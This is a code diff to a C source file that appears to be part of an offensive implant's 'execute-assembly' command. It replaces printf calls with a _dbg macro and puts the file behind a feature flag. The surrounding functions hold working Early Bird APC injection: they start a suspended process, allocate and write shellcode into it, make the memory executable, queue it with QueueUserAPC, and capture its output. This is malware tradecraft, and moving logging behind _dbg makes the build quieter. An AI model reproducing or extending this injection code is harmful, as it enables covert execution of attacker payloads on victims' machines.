@@ -5,6 +5,7 @@
 
 #include "Config.h"
 
+#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
 
 /*
     Helper Functions
@@ -21,7 +22,7 @@ BOOL CreateTemporaryProcess(LPCSTR lpPath, DWORD* dwProcessId, HANDLE* hProcess,
 
 	// Create an anonymous pipe
 	if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)) {
-		printf("CreatePipe failed.\n");
+		_dbg("CreatePipe failed.\n");
 		return 1;
 	}
 
@@ -41,7 +42,7 @@ BOOL CreateTemporaryProcess(LPCSTR lpPath, DWORD* dwProcessId, HANDLE* hProcess,
 	Si.hStdError = hStdOutWrite;
 	Si.dwFlags |= STARTF_USESTDHANDLES;
 
-	printf("\t[i] Running Suspended Process: \"%s\" ... \n", lpPath);
+	_dbg("\t[i] Running Suspended Process: \"%s\" ... \n", lpPath);
 
 	// Creating the process
 	if (!CreateProcessA(
@@ -55,11 +56,11 @@ BOOL CreateTemporaryProcess(LPCSTR lpPath, DWORD* dwProcessId, HANDLE* hProcess,
 		NULL,
 		&Si,
 		&Pi)) {
-		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
+		_dbg("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
-	printf("[+] DONE\n");
+	_dbg("[+] DONE\n");
 
 	// Close the write handle in the parent (no longer needed)
 	CloseHandle(hStdOutWrite);
@@ -85,25 +86,25 @@ BOOL RunViaRemoteApcInjection(IN HANDLE hThread, IN HANDLE hProc, IN PBYTE pPayl
 
 	pAddress = VirtualAllocEx(hProc, NULL, szAllocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (pAddress == NULL) {
-		printf("\t[!] VirtualAllocEx Failed With Error : %d\n", GetLastError());
+		_dbg("\t[!] VirtualAllocEx Failed With Error : %d\n", GetLastError());
 		return FALSE;
 	}
-	printf("\t[+] Allocated memory region at : %p\n", pAddress);
+	_dbg("\t[+] Allocated memory region at : %p\n", pAddress);
 
 	SIZE_T szNumberOfBytesWritten = NULL;
 	if (!WriteProcessMemory(hProc, pAddress, pPayload, szPayloadSize, &szNumberOfBytesWritten) || szNumberOfBytesWritten != szPayloadSize) {
-		printf("\t[!] Failed to write process memory : %d\n", GetLastError());
+		_dbg("\t[!] Failed to write process memory : %d\n", GetLastError());
 		return FALSE;
 	}
-	printf("\t[+] Copied %d bytes to allocated region.\n", szNumberOfBytesWritten);
+	_dbg("\t[+] Copied %d bytes to allocated region.\n", szNumberOfBytesWritten);
 
 	if (!VirtualProtectEx(hProc, pAddress, szPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
-		printf("\t[!] VirtualProtect Failed With Error : %d\n", GetLastError());
+		_dbg("\t[!] VirtualProtect Failed With Error : %d\n", GetLastError());
 		return FALSE;
 	}
 
 	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
-		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
+		_dbg("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -126,15 +127,15 @@ BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen, _Out_
 	HANDLE hThread = NULL;
 	HANDLE hStdOutRead = NULL;		// Read stdout through anon pipe
 
-	printf("[i] Creating \"%s\" as a suspended process. \n", sProcName);
+	_dbg("[i] Creating \"%s\" as a suspended process. \n", sProcName);
 	if (!CreateTemporaryProcess(sProcName, &dwProcId, &hProcess, &hThread, &hStdOutRead)) {
-		printf("Failed to create debugged process : %d\n", GetLastError());
+		_dbg("Failed to create debugged process : %d\n", GetLastError());
 		return 1;
 	}
 
-	printf("[i] Writing shellcode to target process\n");
+	_dbg("[i] Writing shellcode to target process\n");
 	if (!RunViaRemoteApcInjection(hThread, hProcess, buf, szShellcodeLen)) {
-		printf("Failed to RunViaRemoteApcInjection : %d\n", GetLastError());
+		_dbg("Failed to RunViaRemoteApcInjection : %d\n", GetLastError());
 		return 1;
 	}
 
@@ -148,7 +149,7 @@ BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen, _Out_
 	DWORD chunkSize = 1024;		// Read in 1KB chunks
 	char* outputBuffer = (char*)malloc(chunkSize);
 	if (!outputBuffer) {
-		printf("Memory allocation failed.\n");
+		_dbg("Memory allocation failed.\n");
 		return 1;
 	}
 
@@ -168,7 +169,7 @@ BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen, _Out_
 			chunkSize *= 2;  // Double the buffer size
 			outputBuffer = (char*)realloc(outputBuffer, chunkSize);
 			if (!outputBuffer) {
-				printf("Memory allocation failed.\n");
+				_dbg("Memory allocation failed.\n");
 				return 1;
 			}
 		}
@@ -185,6 +186,9 @@ BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen, _Out_
 
 	CloseHandle(hStdOutRead);
 
-	printf("[#] DONE\n");
+	_dbg("[#] DONE\n");
 	return TRUE;
 }
+
+
+#endif //INCLUDE_CMD_EXECUTE_ASSEMBLY
